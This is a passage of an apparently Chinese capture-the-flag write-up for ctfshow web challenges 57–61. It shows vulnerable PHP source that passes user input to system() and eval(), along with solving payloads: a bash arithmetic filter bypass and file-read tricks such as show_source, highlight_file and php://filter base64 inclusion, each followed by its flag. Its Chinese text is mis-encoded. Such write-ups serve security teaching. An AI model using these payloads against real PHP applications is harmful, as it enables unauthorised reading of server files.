punctuation">]</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;63b5cec7-6d15-42b6-bee2-fca53ac2e070&#125;
</code></pre><h2 id="web57"><a class="anchor" href="#web57">#</a> web57</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œå·²æµ‹è¯•ï¼Œå¯ç»•</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-08 01:02:56</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre>*/</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">//flag in 36.php</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>è¿‡æ»¤äº†å­—æ¯ã€æ•°å­—ã€åˆ†å·ã€<span class="token number">2</span>ä¸ªé€šé…ç¬¦</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>åŒå°æ‹¬å· <span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> æ˜¯ Bash Shell ä¸­ä¸“é—¨ç”¨æ¥è¿›è¡Œæ•´æ•°è¿ç®—çš„å‘½ä»¤ï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œå†™æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šè¿ç»´ä¸­å¸¸ç”¨çš„è¿ç®—å‘½ä»¤ã€‚ é€šä¿—åœ°è®²ï¼Œå°±æ˜¯å°†æ•°å­¦è¿ç®—è¡¨è¾¾å¼æ”¾åœ¨<span class="token punctuation">(</span><span class="token punctuation">(</span>å’Œ<span class="token punctuation">)</span><span class="token punctuation">)</span>ä¹‹é—´ã€‚ è¡¨è¾¾å¼å¯ä»¥åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªï¼Œå¤šä¸ªè¡¨è¾¾å¼ä¹‹é—´ä»¥é€—å·<span class="token punctuation">,</span>åˆ†éš”ã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼çš„æƒ…å†µï¼Œä»¥æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª <span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚ å¯ä»¥ä½¿ç”¨$è·å– <span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨$è·å¾—å˜é‡å€¼æ˜¯ç±»ä¼¼çš„ã€‚ å¯ä»¥åœ¨ <span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> å‰é¢åŠ ä¸Š$ç¬¦å·è·å– <span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥ c<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> ä¸ºä¾‹ï¼Œå³å°† a<span class="token operator">+</span>b è¿™ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœèµ‹å€¼ç»™å˜é‡ cã€‚ æ³¨æ„ï¼Œç±»ä¼¼ c<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œä¸åŠ $å°±ä¸èƒ½å–å¾—è¡¨è¾¾å¼çš„ç»“æœã€‚</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">_</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span><span class="token string double-quoted-string">""</span> <span class="token comment">// è¿”å›ä¸Šä¸€æ¬¡å‘½ä»¤</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">echo</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">//=0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">//~ å–å</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">echo</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">//=-1</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">echo</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment">//=-2</span></pre></td></tr><tr><td data-num="10"></td><td><pre>ä»¥æ­¤ç±»æ¨å¾—åˆ°payload</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;e05e5667-84e6-46a7-a067-f04e7668ec7c&#125;
</code></pre><h2 id="web58"><a class="anchor" href="#web58">#</a> web58</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½ç¦ç”¨äº†ï¼Œæ–°çŸ¥è¯†file_get_contents()

payloadï¼š
c=show_source('flag.php');

payload2:
c=echo file_get_contents('flag.php');
</code></pre><pre><code>ctfshow&#123;4238bd73-196d-48b9-862e-a69c6d0fa3e6&#125;
</code></pre><h2 id="web59"><a class="anchor" href="#web59">#</a> web59</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿™æ¬¡ç¦ç”¨äº†file_get_contents()ï¼Œä½†å­¦åˆ°æ–°çŸ¥è¯†includeåŒ…å«


payloadï¼š
c=show_source('flag.php');

payload2:
post:c=include($_GET[1]);
?1=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre><pre><code>ctfshow&#123;4d87fe96-9642-49b8-b744-e4c7dab09324&#125;
</code></pre><h2 id="web60"><a class="anchor" href="#web60">#</a> web60</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>å­¦åˆ°æ–°çŸ¥è¯†ï¼Œhigtlight_file()

payloadï¼š
post:c=include($_GET[1]);
?1=php://filter/read=convert.base64-encode/resource=flag.php

payload2:
c=show_source('flag.php');

payload3:
c=highlight_file('flag.php');
</code></pre><pre><code>ctfshow&#123;f9f2fb7a-81ac-4957-ad1f-854be96f722c&#125;
</code></pre><h2 id="web61"><a class="anchor" href="#web61">#</a> web61</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>payload:
c=show_source('flag.php');

payload2:
c=highlight_file('flag.php');
</code></pre><pre><code>ctfshow&#123;2b6eea44-6add-4cce-b493-5ebe63984a61&#125;
